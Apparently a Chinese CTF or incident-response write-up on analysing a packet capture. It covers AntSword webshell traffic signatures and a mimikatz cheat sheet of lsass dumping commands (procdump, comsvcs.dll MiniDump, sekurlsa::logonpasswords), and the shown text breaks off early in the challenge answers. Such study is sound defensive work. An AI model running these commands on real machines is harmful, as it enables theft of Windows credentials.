{
    "props": {
        "pageProps": {
            "query": {
                "id": "756746fdb6a349c8b8b2b96323bbad9f"
            },
            "ieBrowser": false,
            "needRefresh": false,
            "writingDetail": {
                "id": 82728,
                "outId": "756746fdb6a349c8b8b2b96323bbad9f",
                "articleOutId": "756746fdb6a349c8b8b2b96323bbad9f",
                "html": "<h2 data-tool=\"mdnice编辑器\" style=\"border-bottom-color: rgb(89, 89, 89); margin-top: 30px; margin-bottom: 15px; margin-left: 0px; margin-right: 0px; align-items: unset; background-attachment: scroll; background-clip: border-box; background-color: unset; background-image: none; background-origin: padding-box; background-position-x: 0%; background-position-y: 0%; background-repeat: no-repeat; background-size: auto; border-top-style: none; border-bottom-style: solid; border-left-style: none; border-right-style: none; border-top-width: 1px; border-bottom-width: 2px; border-left-width: 1px; border-right-width: 1px; border-top-color: rgb(0, 0, 0); border-left-color: rgb(0, 0, 0); border-right-color: rgb(0, 0, 0); border-top-left-radius: 0px; border-top-right-radius: 0px; border-bottom-left-radius: 0px; border-bottom-right-radius: 0px; box-shadow: none; display: flex; flex-direction: unset; float: unset; height: auto; justify-content: unset; line-height: 1.5em; overflow-x: unset; overflow-y: unset; padding-top: 0px; padding-bottom: 0px; padding-left: 0px; padding-right: 0px; position: relative; text-align: left; text-shadow: none; transform: none; width: auto; -webkit-box-reflect: unset;\"><span class=\"prefix\" style=\"display: none;\"></span><span class=\"content\" style=\"font-size: 22px; color: rgb(89, 89, 89); border-bottom-color: rgb(89, 89, 89); line-height: 1.5em; letter-spacing: 0em; padding-top: 0px; padding-bottom: 0px; padding-left: 0px; padding-right: 0px; align-items: unset; background-attachment: scroll; background-clip: border-box; background-color: unset; background-image: none; background-origin: padding-box; background-position-x: 0%; background-position-y: 0%; background-repeat: no-repeat; background-size: auto; border-top-style: none; border-bottom-style: solid; border-left-style: none; border-right-style: none; border-top-width: 1px; border-bottom-width: 2px; border-left-width: 1px; border-right-width: 1px; border-top-color: rgb(0, 0, 0); border-left-color: rgb(0, 0, 0); border-right-color: rgb(0, 0, 0); border-top-left-radius: 0px; border-top-right-radius: 0px; border-bottom-left-radius: 0px; border-bottom-right-radius: 0px; box-shadow: none; display: block; font-weight: bold; flex-direction: unset; float: unset; height: auto; justify-content: unset; margin-top: 0px; margin-bottom: 0px; margin-left: 0px; margin-right: 0px; overflow-x: unset; overflow-y: unset; position: relative; text-align: left; text-indent: 0em; text-shadow: none; transform: none; width: auto; -webkit-box-reflect: unset;\">01 前置知识</span><span class=\"suffix\" style=\"display: none;\"></span></h2> \n<p data-tool=\"mdnice编辑器\" style=\"color: rgb(89, 89, 89); font-size: 16px; line-height: 1.8em; letter-spacing: 0em; text-align: left; text-indent: 0em; margin-top: 0px; margin-bottom: 0px; margin-left: 0px; margin-right: 0px; padding-top: 8px; padding-bottom: 8px; padding-left: 0px; padding-right: 0px;\">wireshark下载地址：https://wireshark.org</p> \n<p data-tool=\"mdnice编辑器\" style=\"color: rgb(89, 89, 89); font-size: 16px; line-height: 1.8em; letter-spacing: 0em; text-align: left; text-indent: 0em; margin-top: 0px; margin-bottom: 0px; margin-left: 0px; margin-right: 0px; padding-top: 8px; padding-bottom: 8px; padding-left: 0px; padding-right: 0px;\">更改中文配置 编辑 -- 首选项 -- 外观 -- 列</p> \n<p data-tool=\"mdnice编辑器\" style=\"color: rgb(89, 89, 89); font-size: 16px; line-height: 1.8em; letter-spacing: 0em; text-align: left; text-indent: 0em; margin-top: 0px; margin-bottom: 0px; margin-left: 0px; margin-right: 0px; padding-top: 8px; padding-bottom: 8px; padding-left: 0px; padding-right: 0px;\">自行增加源端口和目标端口配置</p> \n<p data-tool=\"mdnice编辑器\" style=\"color: rgb(89, 89, 89); font-size: 16px; line-height: 1.8em; letter-spacing: 0em; text-align: left; text-indent: 0em; margin-top: 0px; margin-bottom: 0px; margin-left: 0px; margin-right: 0px; padding-top: 8px; padding-bottom: 8px; padding-left: 0px; padding-right: 0px;\"><img src=\"https://files.mdnice.com/user/73977/923f9d3e-68b6-47dc-ae4e-de39643d2d30.png\" alt style=\"display: block; margin-top: 0px; margin-right: auto; margin-bottom: 0px; margin-left: auto; max-width: 100%;\"> 将pcap文件导入wireshark，使用筛选功能筛选http数据包</p> \n<p data-tool=\"mdnice编辑器\" style=\"color: rgb(89, 89, 89); font-size: 16px; line-height: 1.8em; letter-spacing: 0em; text-align: left; text-indent: 0em; margin-top: 0px; margin-bottom: 0px; margin-left: 0px; margin-right: 0px; padding-top: 8px; padding-bottom: 8px; padding-left: 0px; padding-right: 0px;\"><img src=\"https://files.mdnice.com/user/73977/fea640ae-979f-4ea8-9205-ef85dbacd56f.png\" alt style=\"display: block; margin-top: 0px; margin-right: auto; margin-bottom: 0px; margin-left: auto; max-width: 100%;\"> 对于抓到的数据包使用 右键 -- 追踪流功能进行查看数据包详情 <img src=\"https://files.mdnice.com/user/73977/7d3309a0-3786-40ae-a401-6296c299d49e.png\" alt style=\"display: block; margin-top: 0px; margin-right: auto; margin-bottom: 0px; margin-left: auto; max-width: 100%;\"></p> \n<h2 data-tool=\"mdnice编辑器\" style=\"border-bottom-color: rgb(89, 89, 89); margin-top: 30px; margin-bottom: 15px; margin-left: 0px; margin-right: 0px; align-items: unset; background-attachment: scroll; background-clip: border-box; background-color: unset; background-image: none; background-origin: padding-box; background-position-x: 0%; background-position-y: 0%; background-repeat: no-repeat; background-size: auto; border-top-style: none; border-bottom-style: solid; border-left-style: none; border-right-style: none; border-top-width: 1px; border-bottom-width: 2px; border-left-width: 1px; border-right-width: 1px; border-top-color: rgb(0, 0, 0); border-left-color: rgb(0, 0, 0); border-right-color: rgb(0, 0, 0); border-top-left-radius: 0px; border-top-right-radius: 0px; border-bottom-left-radius: 0px; border-bottom-right-radius: 0px; box-shadow: none; display: flex; flex-direction: unset; float: unset; height: auto; justify-content: unset; line-height: 1.5em; overflow-x: unset; overflow-y: unset; padding-top: 0px; padding-bottom: 0px; padding-left: 0px; padding-right: 0px; position: relative; text-align: left; text-shadow: none; transform: none; width: auto; -webkit-box-reflect: unset;\"><span class=\"prefix\" style=\"display: none;\"></span><span class=\"content\" style=\"font-size: 22px; color: rgb(89, 89, 89); border-bottom-color: rgb(89, 89, 89); line-height: 1.5em; letter-spacing: 0em; padding-top: 0px; padding-bottom: 0px; padding-left: 0px; padding-right: 0px; align-items: unset; background-attachment: scroll; background-clip: border-box; background-color: unset; background-image: none; background-origin: padding-box; background-position-x: 0%; background-position-y: 0%; background-repeat: no-repeat; background-size: auto; border-top-style: none; border-bottom-style: solid; border-left-style: none; border-right-style: none; border-top-width: 1px; border-bottom-width: 2px; border-left-width: 1px; border-right-width: 1px; border-top-color: rgb(0, 0, 0); border-left-color: rgb(0, 0, 0); border-right-color: rgb(0, 0, 0); border-top-left-radius: 0px; border-top-right-radius: 0px; border-bottom-left-radius: 0px; border-bottom-right-radius: 0px; box-shadow: none; display: block; font-weight: bold; flex-direction: unset; float: unset; height: auto; justify-content: unset; margin-top: 0px; margin-bottom: 0px; margin-left: 0px; margin-right: 0px; overflow-x: unset; overflow-y: unset; position: relative; text-align: left; text-indent: 0em; text-shadow: none; transform: none; width: auto; -webkit-box-reflect: unset;\">蚁剑流量特征：</span><span class=\"suffix\" style=\"display: none;\"></span></h2> \n<h3 data-tool=\"mdnice编辑器\" style=\"margin-top: 30px; margin-bottom: 15px; margin-left: 0px; margin-right: 0px; padding-top: 0px; padding-bottom: 0px; padding-left: 0px; padding-right: 0px; display: block;\"><span class=\"prefix\" style=\"display: none;\"></span><span class=\"content\" style=\"font-size: 20px; color: rgb(89, 89, 89); line-height: 1.5em; letter-spacing: 0em; text-align: left; font-weight: bold; display: block;\">特征1：</span><span class=\"suffix\" style=\"display: none;\"></span></h3> \n<p data-tool=\"mdnice编辑器\" style=\"color: rgb(89, 89, 89); font-size: 16px; line-height: 1.8em; letter-spacing: 0em; text-align: left; text-indent: 0em; margin-top: 0px; margin-bottom: 0px; margin-left: 0px; margin-right: 0px; padding-top: 8px; padding-bottom: 8px; padding-left: 0px; padding-right: 0px;\">每个请求体都由以下数据开始</p> \n<p data-tool=\"mdnice编辑器\" style=\"color: rgb(89, 89, 89); font-size: 16px; line-height: 1.8em; letter-spacing: 0em; text-align: left; text-indent: 0em; margin-top: 0px; margin-bottom: 0px; margin-left: 0px; margin-right: 0px; padding-top: 8px; padding-bottom: 8px; padding-left: 0px; padding-right: 0px;\">@ini_set(\"display_errors\",“0”);@set_time_limit(0);,</p> \n<h3 data-tool=\"mdnice编辑器\" style=\"margin-top: 30px; margin-bottom: 15px; margin-left: 0px; margin-right: 0px; padding-top: 0px; padding-bottom: 0px; padding-left: 0px; padding-right: 0px; display: block;\"><span class=\"prefix\" style=\"display: none;\"></span><span class=\"content\" style=\"font-size: 20px; color: rgb(89, 89, 89); line-height: 1.5em; letter-spacing: 0em; text-align: left; font-weight: bold; display: block;\">特征2：</span><span class=\"suffix\" style=\"display: none;\"></span></h3> \n<p data-tool=\"mdnice编辑器\" style=\"color: rgb(89, 89, 89); font-size: 16px; line-height: 1.8em; letter-spacing: 0em; text-align: left; text-indent: 0em; margin-top: 0px; margin-bottom: 0px; margin-left: 0px; margin-right: 0px; padding-top: 8px; padding-bottom: 8px; padding-left: 0px; padding-right: 0px;\">content-Length：有uelencode字段</p> \n<figure data-tool=\"mdnice编辑器\" style=\"margin-top: 10px; margin-bottom: 10px; margin-left: 0px; margin-right: 0px; padding-top: 0px; padding-bottom: 0px; padding-left: 0px; padding-right: 0px; display: flex; flex-direction: column; justify-content: center; align-items: center;\"> \n <img src=\"https://files.mdnice.com/user/73977/a78ebbb7-8cfd-430e-9b0f-765f2ae59ecb.jpg\" alt style=\"display: block; margin-top: 0px; margin-right: auto; margin-bottom: 0px; margin-left: auto; max-width: 100%; border-top-style: none; border-bottom-style: none; border-left-style: none; border-right-style: none; border-top-width: 3px; border-bottom-width: 3px; border-left-width: 3px; border-right-width: 3px; border-top-color: rgba(0, 0, 0, 0.4); border-bottom-color: rgba(0, 0, 0, 0.4); border-left-color: rgba(0, 0, 0, 0.4); border-right-color: rgba(0, 0, 0, 0.4); border-top-left-radius: 0px; border-top-right-radius: 0px; border-bottom-right-radius: 0px; border-bottom-left-radius: 0px; object-fit: fill; box-shadow: rgba(0, 0, 0, 0) 0px 0px 0px 0px;\"> \n</figure> \n<h3 data-tool=\"mdnice编辑器\" style=\"margin-top: 30px; margin-bottom: 15px; margin-left: 0px; margin-right: 0px; padding-top: 0px; padding-bottom: 0px; padding-left: 0px; padding-right: 0px; display: block;\"><span class=\"prefix\" style=\"display: none;\"></span><span class=\"content\" style=\"font-size: 20px; color: rgb(89, 89, 89); line-height: 1.5em; letter-spacing: 0em; text-align: left; font-weight: bold; display: block;\">特征3：</span><span class=\"suffix\" style=\"display: none;\"></span></h3> \n<p data-tool=\"mdnice编辑器\" style=\"color: rgb(89, 89, 89); font-size: 16px; line-height: 1.8em; letter-spacing: 0em; text-align: left; text-indent: 0em; margin-top: 0px; margin-bottom: 0px; margin-left: 0px; margin-right: 0px; padding-top: 8px; padding-bottom: 8px; padding-left: 0px; padding-right: 0px;\">响应包，都是明文(也存在加密的情况)</p> \n<p data-tool=\"mdnice编辑器\" style=\"color: rgb(89, 89, 89); font-size: 16px; line-height: 1.8em; letter-spacing: 0em; text-align: left; text-indent: 0em; margin-top: 0px; margin-bottom: 0px; margin-left: 0px; margin-right: 0px; padding-top: 8px; padding-bottom: 8px; padding-left: 0px; padding-right: 0px;\">选择靶机 -- 本机查看返回结果</p> \n<p data-tool=\"mdnice编辑器\" style=\"color: rgb(89, 89, 89); font-size: 16px; line-height: 1.8em; letter-spacing: 0em; text-align: left; text-indent: 0em; margin-top: 0px; margin-bottom: 0px; margin-left: 0px; margin-right: 0px; padding-top: 8px; padding-bottom: 8px; padding-left: 0px; padding-right: 0px;\">发现结果为一段随机字符+返回结果</p> \n<figure data-tool=\"mdnice编辑器\" style=\"margin-top: 10px; margin-bottom: 10px; margin-left: 0px; margin-right: 0px; padding-top: 0px; padding-bottom: 0px; padding-left: 0px; padding-right: 0px; display: flex; flex-direction: column; justify-content: center; align-items: center;\"> \n <img src=\"https://files.mdnice.com/user/73977/6f6ddeeb-33c5-405d-986e-195fc97975a0.png\" alt style=\"display: block; margin-top: 0px; margin-right: auto; margin-bottom: 0px; margin-left: auto; max-width: 100%; border-top-style: none; border-bottom-style: none; border-left-style: none; border-right-style: none; border-top-width: 3px; border-bottom-width: 3px; border-left-width: 3px; border-right-width: 3px; border-top-color: rgba(0, 0, 0, 0.4); border-bottom-color: rgba(0, 0, 0, 0.4); border-left-color: rgba(0, 0, 0, 0.4); border-right-color: rgba(0, 0, 0, 0.4); border-top-left-radius: 0px; border-top-right-radius: 0px; border-bottom-right-radius: 0px; border-bottom-left-radius: 0px; object-fit: fill; box-shadow: rgba(0, 0, 0, 0) 0px 0px 0px 0px;\"> \n</figure> \n<h2 data-tool=\"mdnice编辑器\" style=\"border-bottom-color: rgb(89, 89, 89); margin-top: 30px; margin-bottom: 15px; margin-left: 0px; margin-right: 0px; align-items: unset; background-attachment: scroll; background-clip: border-box; background-color: unset; background-image: none; background-origin: padding-box; background-position-x: 0%; background-position-y: 0%; background-repeat: no-repeat; background-size: auto; border-top-style: none; border-bottom-style: solid; border-left-style: none; border-right-style: none; border-top-width: 1px; border-bottom-width: 2px; border-left-width: 1px; border-right-width: 1px; border-top-color: rgb(0, 0, 0); border-left-color: rgb(0, 0, 0); border-right-color: rgb(0, 0, 0); border-top-left-radius: 0px; border-top-right-radius: 0px; border-bottom-left-radius: 0px; border-bottom-right-radius: 0px; box-shadow: none; display: flex; flex-direction: unset; float: unset; height: auto; justify-content: unset; line-height: 1.5em; overflow-x: unset; overflow-y: unset; padding-top: 0px; padding-bottom: 0px; padding-left: 0px; padding-right: 0px; position: relative; text-align: left; text-shadow: none; transform: none; width: auto; -webkit-box-reflect: unset;\"><span class=\"prefix\" style=\"display: none;\"></span><span class=\"content\" style=\"font-size: 22px; color: rgb(89, 89, 89); border-bottom-color: rgb(89, 89, 89); line-height: 1.5em; letter-spacing: 0em; padding-top: 0px; padding-bottom: 0px; padding-left: 0px; padding-right: 0px; align-items: unset; background-attachment: scroll; background-clip: border-box; background-color: unset; background-image: none; background-origin: padding-box; background-position-x: 0%; background-position-y: 0%; background-repeat: no-repeat; background-size: auto; border-top-style: none; border-bottom-style: solid; border-left-style: none; border-right-style: none; border-top-width: 1px; border-bottom-width: 2px; border-left-width: 1px; border-right-width: 1px; border-top-color: rgb(0, 0, 0); border-left-color: rgb(0, 0, 0); border-right-color: rgb(0, 0, 0); border-top-left-radius: 0px; border-top-right-radius: 0px; border-bottom-left-radius: 0px; border-bottom-right-radius: 0px; box-shadow: none; display: block; font-weight: bold; flex-direction: unset; float: unset; height: auto; justify-content: unset; margin-top: 0px; margin-bottom: 0px; margin-left: 0px; margin-right: 0px; overflow-x: unset; overflow-y: unset; position: relative; text-align: left; text-indent: 0em; text-shadow: none; transform: none; width: auto; -webkit-box-reflect: unset;\">mimikatz基本用法</span><span class=\"suffix\" style=\"display: none;\"></span></h2> \n<h3 data-tool=\"mdnice编辑器\" style=\"margin-top: 30px; margin-bottom: 15px; margin-left: 0px; margin-right: 0px; padding-top: 0px; padding-bottom: 0px; padding-left: 0px; padding-right: 0px; display: block;\"><span class=\"prefix\" style=\"display: none;\"></span><span class=\"content\" style=\"font-size: 20px; color: rgb(89, 89, 89); line-height: 1.5em; letter-spacing: 0em; text-align: left; font-weight: bold; display: block;\">抓取lsass转储文件</span><span class=\"suffix\" style=\"display: none;\"></span></h3> \n<pre class=\"custom\" data-tool=\"mdnice编辑器\" style=\"border-radius: 5px; box-shadow: rgba(0, 0, 0, 0.55) 0px 2px 10px; text-align: left; margin-top: 10px; margin-bottom: 10px; margin-left: 0px; margin-right: 0px; padding-top: 0px; padding-bottom: 0px; padding-left: 0px; padding-right: 0px;\"><span style=\"display: block; background: url(https://files.mdnice.com/user/3441/876cad08-0422-409d-bb5a-08afec5da8ee.svg); height: 30px; width: 100%; background-size: 40px; background-repeat: no-repeat; background-color: #282c34; margin-bottom: -7px; border-radius: 5px; background-position: 10px 10px;\"></span><code class=\"hljs\" style=\"overflow-x: auto; padding: 16px; color: #abb2bf; padding-top: 15px; background: #282c34; border-radius: 5px; display: -webkit-box; font-family: Consolas, Monaco, Menlo, monospace; font-size: 12px;\">查看lsass.exe&nbsp;的PID号<br>tasklist&nbsp;/svc&nbsp;|&nbsp;findstr&nbsp;lsass.exe<br></code></pre> \n<pre class=\"custom\" data-tool=\"mdnice编辑器\" style=\"border-radius: 5px; box-shadow: rgba(0, 0, 0, 0.55) 0px 2px 10px; text-align: left; margin-top: 10px; margin-bottom: 10px; margin-left: 0px; margin-right: 0px; padding-top: 0px; padding-bottom: 0px; padding-left: 0px; padding-right: 0px;\"><span style=\"display: block; background: url(https://files.mdnice.com/user/3441/876cad08-0422-409d-bb5a-08afec5da8ee.svg); height: 30px; width: 100%; background-size: 40px; background-repeat: no-repeat; background-color: #282c34; margin-bottom: -7px; border-radius: 5px; background-position: 10px 10px;\"></span><code class=\"hljs\" style=\"overflow-x: auto; padding: 16px; color: #abb2bf; padding-top: 15px; background: #282c34; border-radius: 5px; display: -webkit-box; font-family: Consolas, Monaco, Menlo, monospace; font-size: 12px;\"><span class=\"hljs-comment\" style=\"color: #5c6370; font-style: italic; line-height: 26px;\">#&nbsp;Procdump&nbsp;抓取lsass进程dmp文件</span><br>procdump64.exe&nbsp;-accepteula&nbsp;-ma&nbsp;lsass.exe&nbsp;lsass_dump<br><span class=\"hljs-comment\" style=\"color: #5c6370; font-style: italic; line-height: 26px;\">#&nbsp;通过lsass的pid抓取</span><br>procdump64.exe&nbsp;-accepteula&nbsp;-ma&nbsp;pid&nbsp;lsass_dump<br><br><br><span class=\"hljs-comment\" style=\"color: #5c6370; font-style: italic; line-height: 26px;\">#&nbsp;createdump.exe抓取dmp</span><br>createdump.exe&nbsp;-u&nbsp;-f&nbsp;lsass.dmp&nbsp;lsass[PID]<br><br><span class=\"hljs-comment\" style=\"color: #5c6370; font-style: italic; line-height: 26px;\">#&nbsp;comsvcs.dll获取dmp</span><br><span class=\"hljs-comment\" style=\"color: #5c6370; font-style: italic; line-height: 26px;\">#&nbsp;需要保证当前会话已经启用SeDebugPrivilege特权</span><br><span class=\"hljs-comment\" style=\"color: #5c6370; font-style: italic; line-height: 26px;\">#&nbsp;cmd本身会禁用该特权，powershell默认开启</span><br><span class=\"hljs-comment\" style=\"color: #5c6370; font-style: italic; line-height: 26px;\">#&nbsp;判断cmd是否开启</span><br>whoami&nbsp;/priv&nbsp;|&nbsp;findstr&nbsp;SeDebugPrivilege<br><span class=\"hljs-comment\" style=\"color: #5c6370; font-style: italic; line-height: 26px;\">#&nbsp;判断powershell是否开启</span><br>powershell&nbsp;whoami&nbsp;/priv&nbsp;|&nbsp;findstr&nbsp;SeDebugPrivilege<br><br>rundll32.exe&nbsp;comsvcs.dll,&nbsp;MiniDump&nbsp;lsass[PID]&nbsp;lsass.dmp&nbsp;full<br><br></code></pre> \n<p data-tool=\"mdnice编辑器\" style=\"color: rgb(89, 89, 89); font-size: 16px; line-height: 1.8em; letter-spacing: 0em; text-align: left; text-indent: 0em; margin-top: 0px; margin-bottom: 0px; margin-left: 0px; margin-right: 0px; padding-top: 8px; padding-bottom: 8px; padding-left: 0px; padding-right: 0px;\">或者直接任务管理器 搜索lsass进程，转储</p> \n<figure data-tool=\"mdnice编辑器\" style=\"margin-top: 10px; margin-bottom: 10px; margin-left: 0px; margin-right: 0px; padding-top: 0px; padding-bottom: 0px; padding-left: 0px; padding-right: 0px; display: flex; flex-direction: column; justify-content: center; align-items: center;\"> \n <img src=\"https://files.mdnice.com/user/73977/2b733a52-2c11-4f62-9719-3be32338039a.png\" alt style=\"display: block; margin-top: 0px; margin-right: auto; margin-bottom: 0px; margin-left: auto; max-width: 100%; border-top-style: none; border-bottom-style: none; border-left-style: none; border-right-style: none; border-top-width: 3px; border-bottom-width: 3px; border-left-width: 3px; border-right-width: 3px; border-top-color: rgba(0, 0, 0, 0.4); border-bottom-color: rgba(0, 0, 0, 0.4); border-left-color: rgba(0, 0, 0, 0.4); border-right-color: rgba(0, 0, 0, 0.4); border-top-left-radius: 0px; border-top-right-radius: 0px; border-bottom-right-radius: 0px; border-bottom-left-radius: 0px; object-fit: fill; box-shadow: rgba(0, 0, 0, 0) 0px 0px 0px 0px;\"> \n</figure> \n<h3 data-tool=\"mdnice编辑器\" style=\"margin-top: 30px; margin-bottom: 15px; margin-left: 0px; margin-right: 0px; padding-top: 0px; padding-bottom: 0px; padding-left: 0px; padding-right: 0px; display: block;\"><span class=\"prefix\" style=\"display: none;\"></span><span class=\"content\" style=\"font-size: 20px; color: rgb(89, 89, 89); line-height: 1.5em; letter-spacing: 0em; text-align: left; font-weight: bold; display: block;\">mimikatz解密lsass.dmp文件</span><span class=\"suffix\" style=\"display: none;\"></span></h3> \n<pre class=\"custom\" data-tool=\"mdnice编辑器\" style=\"border-radius: 5px; box-shadow: rgba(0, 0, 0, 0.55) 0px 2px 10px; text-align: left; margin-top: 10px; margin-bottom: 10px; margin-left: 0px; margin-right: 0px; padding-top: 0px; padding-bottom: 0px; padding-left: 0px; padding-right: 0px;\"><span style=\"display: block; background: url(https://files.mdnice.com/user/3441/876cad08-0422-409d-bb5a-08afec5da8ee.svg); height: 30px; width: 100%; background-size: 40px; background-repeat: no-repeat; background-color: #282c34; margin-bottom: -7px; border-radius: 5px; background-position: 10px 10px;\"></span><code class=\"hljs\" style=\"overflow-x: auto; padding: 16px; color: #abb2bf; padding-top: 15px; background: #282c34; border-radius: 5px; display: -webkit-box; font-family: Consolas, Monaco, Menlo, monospace; font-size: 12px;\"><span class=\"hljs-comment\" style=\"color: #5c6370; font-style: italic; line-height: 26px;\">#&nbsp;管理员权限</span><br><span class=\"hljs-comment\" style=\"color: #5c6370; font-style: italic; line-height: 26px;\">#&nbsp;导出lsass.dmp文件后解密</span><br>mimikatz&nbsp;<span class=\"hljs-comment\" style=\"color: #5c6370; font-style: italic; line-height: 26px;\">#&nbsp;sekurlsa::minidump&nbsp;C:\\Windows\\System32\\lsass.dmp</span><br>mimikatz&nbsp;<span class=\"hljs-comment\" style=\"color: #5c6370; font-style: italic; line-height: 26px;\">#&nbsp;sekurlsa::logonpasswords</span><br><br><span class=\"hljs-comment\" style=\"color: #5c6370; font-style: italic; line-height: 26px;\">#&nbsp;直接解密</span><br>mimikatz&nbsp;<span class=\"hljs-comment\" style=\"color: #5c6370; font-style: italic; line-height: 26px;\">#&nbsp;privilege::debug</span><br>mimikatz&nbsp;<span class=\"hljs-comment\" style=\"color: #5c6370; font-style: italic; line-height: 26px;\">#&nbsp;sekurlsa::logonpasswords&nbsp;full</span><br></code></pre> \n<h2 data-tool=\"mdnice编辑器\" style=\"border-bottom-color: rgb(89, 89, 89); margin-top: 30px; margin-bottom: 15px; margin-left: 0px; margin-right: 0px; align-items: unset; background-attachment: scroll; background-clip: border-box; background-color: unset; background-image: none; background-origin: padding-box; background-position-x: 0%; background-position-y: 0%; background-repeat: no-repeat; background-size: auto; border-top-style: none; border-bottom-style: solid; border-left-style: none; border-right-style: none; border-top-width: 1px; border-bottom-width: 2px; border-left-width: 1px; border-right-width: 1px; border-top-color: rgb(0, 0, 0); border-left-color: rgb(0, 0, 0); border-right-color: rgb(0, 0, 0); border-top-left-radius: 0px; border-top-right-radius: 0px; border-bottom-left-radius: 0px; border-bottom-right-radius: 0px; box-shadow: none; display: flex; flex-direction: unset; float: unset; height: auto; justify-content: unset; line-height: 1.5em; overflow-x: unset; overflow-y: unset; padding-top: 0px; padding-bottom: 0px; padding-left: 0px; padding-right: 0px; position: relative; text-align: left; text-shadow: none; transform: none; width: auto; -webkit-box-reflect: unset;\"><span class=\"prefix\" style=\"display: none;\"></span><span class=\"content\" style=\"font-size: 22px; color: rgb(89, 89, 89); border-bottom-color: rgb(89, 89, 89); line-height: 1.5em; letter-spacing: 0em; padding-top: 0px; padding-bottom: 0px; padding-left: 0px; padding-right: 0px; align-items: unset; background-attachment: scroll; background-clip: border-box; background-color: unset; background-image: none; background-origin: padding-box; background-position-x: 0%; background-position-y: 0%; background-repeat: no-repeat; background-size: auto; border-top-style: none; border-bottom-style: solid; border-left-style: none; border-right-style: none; border-top-width: 1px; border-bottom-width: 2px; border-left-width: 1px; border-right-width: 1px; border-top-color: rgb(0, 0, 0); border-left-color: rgb(0, 0, 0); border-right-color: rgb(0, 0, 0); border-top-left-radius: 0px; border-top-right-radius: 0px; border-bottom-left-radius: 0px; border-bottom-right-radius: 0px; box-shadow: none; display: block; font-weight: bold; flex-direction: unset; float: unset; height: auto; justify-content: unset; margin-top: 0px; margin-bottom: 0px; margin-left: 0px; margin-right: 0px; overflow-x: unset; overflow-y: unset; position: relative; text-align: left; text-indent: 0em; text-shadow: none; transform: none; width: auto; -webkit-box-reflect: unset;\">题目</span><span class=\"suffix\" style=\"display: none;\"></span></h2> \n<p data-tool=\"mdnice编辑器\" style=\"color: rgb(89, 89, 89); font-size: 16px; line-height: 1.8em; letter-spacing: 0em; text-align: left; text-indent: 0em; margin-top: 0px; margin-bottom: 0px; margin-left: 0px; margin-right: 0px; padding-top: 8px; padding-bottom: 8px; padding-left: 0px; padding-right: 0px;\">@老狼 应急响应小组成员老狼在 waf 上下载了一段流量，请你分析黑客攻击手法，并且解答下面问题</p> \n<ol data-tool=\"mdnice编辑器\" style=\"list-style-type: decimal; margin-top: 8px; margin-bottom: 8px; margin-left: 0px; margin-right: 0px; padding-top: 0px; padding-bottom: 0px; padding-left: 25px; padding-right: 0px; color: rgb(0, 0, 0);\"> \n <li> \n  <section style=\"margin-top: 5px; margin-bottom: 5px; color: rgb(1, 1, 1); font-size: 16px; line-height: 1.8em; letter-spacing: 0em; text-align: left; font-weight: normal;\">\n    管理员Admin账号的密码是什么？ \n  </section></li> \n <li> \n  <section style=\"margin-top: 5px; margin-bottom: 5px; color: rgb(1, 1, 1); font-size: 16px; line-height: 1.8em; letter-spacing: 0em; text-align: left; font-weight: normal;\">\n    LSASS.exe的程序进程ID是多少？ \n  </section></li> \n <li> \n  <section style=\"margin-top: 5px; margin-bottom: 5px; color: rgb(1, 1, 1); font-size: 16px; line-height: 1.8em; letter-spacing: 0em; text-align: left; font-weight: normal;\">\n    用户WIN101的密码是什么? \n  </section></li> \n</ol> \n<h2 data-tool=\"mdnice编辑器\" style=\"border-bottom-color: rgb(89, 89, 89); margin-top: 30px; margin-bottom: 15px; margin-left: 0px; margin-right: 0px; align-items: unset; background-attachment: scroll; background-clip: border-box; background-color: unset; background-image: none; background-origin: padding-box; background-position-x: 0%; background-position-y: 0%; background-repeat: no-repeat; background-size: auto; border-top-style: none; border-bottom-style: solid; border-left-style: none; border-right-style: none; border-top-width: 1px; border-bottom-width: 2px; border-left-width: 1px; border-right-width: 1px; border-top-color: rgb(0, 0, 0); border-left-color: rgb(0, 0, 0); border-right-color: rgb(0, 0, 0); border-top-left-radius: 0px; border-top-right-radius: 0px; border-bottom-left-radius: 0px; border-bottom-right-radius: 0px; box-shadow: none; display: flex; flex-direction: unset; float: unset; height: auto; justify-content: unset; line-height: 1.5em; overflow-x: unset; overflow-y: unset; padding-top: 0px; padding-bottom: 0px; padding-left: 0px; padding-right: 0px; position: relative; text-align: left; text-shadow: none; transform: none; width: auto; -webkit-box-reflect: unset;\"><span class=\"prefix\" style=\"display: none;\"></span><span class=\"content\" style=\"font-size: 22px; color: rgb(89, 89, 89); border-bottom-color: rgb(89, 89, 89); line-height: 1.5em; letter-spacing: 0em; padding-top: 0px; padding-bottom: 0px; padding-left: 0px; padding-right: 0px; align-items: unset; background-attachment: scroll; background-clip: border-box; background-color: unset; background-image: none; background-origin: padding-box; background-position-x: 0%; background-position-y: 0%; background-repeat: no-repeat; background-size: auto; border-top-style: none; border-bottom-style: solid; border-left-style: none; border-right-style: none; border-top-width: 1px; border-bottom-width: 2px; border-left-width: 1px; border-right-width: 1px; border-top-color: rgb(0, 0, 0); border-left-color: rgb(0, 0, 0); border-right-color: rgb(0, 0, 0); border-top-left-radius: 0px; border-top-right-radius: 0px; border-bottom-left-radius: 0px; border-bottom-right-radius: 0px; box-shadow: none; display: block; font-weight: bold; flex-direction: unset; float: unset; height: auto; justify-content: unset; margin-top: 0px; margin-bottom: 0px; margin-left: 0px; margin-right: 0px; overflow-x: unset; overflow-y: unset; position: relative; text-align: left; text-indent: 0em; text-shadow: none; transform: none; width: auto; -webkit-box-reflect: unset;\">1、管理员Admin账号的密码是什么？</span><span class=\"suffix\" style=\"display: none;\"></span></h2> \n<p data-tool=\"mdnice编辑器\" style=\"color: rgb(89, 89, 89); font-size: 16px; line-height: 1.8em; letter-spacing: 0em; text-align: left; text-indent: 0em; margin-top: 0px; margin-bottom: 0px; margin-left: 0px; margin-right: 0px; padding-top: 8px; padding-bottom: 8px; padding-left: 0px; padding-right: 0px;\">没啥好思路，根据题目说要找admin账号的密码，先搜搜http数据包中的admin关键词</p> \n<p data-tool=\"mdnice编辑器\" style=\"color: rgb(89, 89, 89); font-size: 16px; line-height: 1.8em; letter-spacing: 0em; text-align: left; text-indent: 0em; margin-top: 0px; margin-bottom: 0px; margin-left: 0px; margin-right: 0px; padding-top: 8px; padding-bottom: 8px; padding-left: 0px; padding-right: 0px;\">查找http数据包</p> \n<p data-tool=\"mdnice编辑器\" style=\"color: rgb(89, 89, 89); font-size: 16px; line-height: 1.8em; letter-spacing: 0em; text-align: left; text-indent: 0em; margin-top: 0px; margin-bottom: 0px; margin-left: 0px; margin-right: 0px; padding-top: 8px; padding-bottom: 8px; padding-left: 